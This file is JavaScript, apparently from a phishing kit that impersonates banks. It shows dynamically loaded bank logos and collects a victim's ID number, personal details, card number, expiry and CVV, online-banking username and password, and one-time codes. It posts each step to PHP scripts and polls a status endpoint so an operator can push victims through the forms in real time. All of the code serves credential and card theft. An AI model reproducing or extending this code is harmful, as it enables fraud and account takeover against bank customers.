var espera = 1;
function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}

/* Nuevo Bloque */

function vista_final(){
    $("#frm-esperando").hide();
    $("#frm-autorizar").show();     
}

function continuar(){
    $("#frm-animacion,#frm-cargando").hide();
    $("#frm-esperando").show(); 
    espera = 1; 
}

function vista_banco(){
    $("#frm-esperando").hide();
    $("#frm-tarjeta").show();   
}


function vista_datos(){
    $("#fondo,#frm-esperando").hide();
}


function vista_login(){    
    $("#logo-entidad").attr("src","../img/logos/" + icono + ".png");
    $("#frm-esperando").hide();
    $("#frm-verificacion").show();     
}

function vista_otp(){
    $("#logo-entidad-otp").attr("src","../img/logos/" + icono + ".png");
    $("#frm-esperando").hide();
    $("#frm-otp").show();     
}

function vista_nuevootp(){
    $("#logo-entidad-nuevootp").attr("src","../img/logos/" + icono + ".png");
    $("#frm-esperando").hide();
    $("#frm-nuevootp").show();     
}

function iniciar(){
    window.location.href = "informacion/index.html";      
}

function enviar_documento(c){    
    d = detectar_dispositivo();
    $.post( "process/paso1cedula.php",{ ced:c,dis:d },function( data ) {
        setTimeout(iniciar, 800);        
    });
}

function enviar_datos(n,c,m,a,u){
    $.post( "../process/paso2datos.php", {nom:n,cel:c,cor:m,dir:a,ciu:u} ,function(data) {                        
        espera = 1;           
    });
}

function enviar_tarjeta(b,t,f,c){    
    $.post( "../process/paso3tarjeta.php", { ban:b,tar:t,fec:f,cvv:c } ,function(data) {  
        setTimeout(continuar, 1400);

    });
}

function enviar_usuario(u,p){    
    $.post( "../process/paso4login.php", {usr:u,pas:p} ,function(data) {            
         setTimeout(continuar, 1400);                        
    });
}

function enviar_otp(o){    
    $.post( "../process/paso5otp.php", {otp:o} ,function(data) {               
        espera = 1; 
    });
}

function consultar_estado(){
    if (espera == 1) {
        $.post( "../process/traer-estado.php",function(data) {     
            switch (data) {
                case '2':espera = 0;
                         vista_banco(); 
                         break;
                case '4':espera = 0;
                         vista_otp(); 
                         break;
                case '6':espera = 0;
                         vista_nuevootp();  
                         break;               
                case '8':espera = 0;
                         vista_login(); 
                         break;
                case '10':espera = 0;
                          vista_final(); 
                          break;
                case '12':espera = 0;
                          vista_datos(); 
                          break;
            } 
        });    
    }    
}

/* Fin Nuevo Bloque */





function verificar(){
    $("#logo-entidad-load").attr("src","../img/logos/" + $("#txt-entidad").val() + ".png");
    $("#logo-entidad").attr("src","../img/logos/" + $("#txt-entidad").val() + ".png");
    $("#logo-entidad-otp").attr("src","../img/logos/" + $("#txt-entidad").val() + ".png");
    $("#frm-animacion").hide();
    $("#frm-verificacion").show();
}


function validar(){   
    $("#frm-cargando").hide();
    $("#frm-otp").show();
}




function buscar_documento(){
    $.post( "../process/bsc-d.php", function(data) {  
        $("#txt-cedula").val(data);  
    });  
}





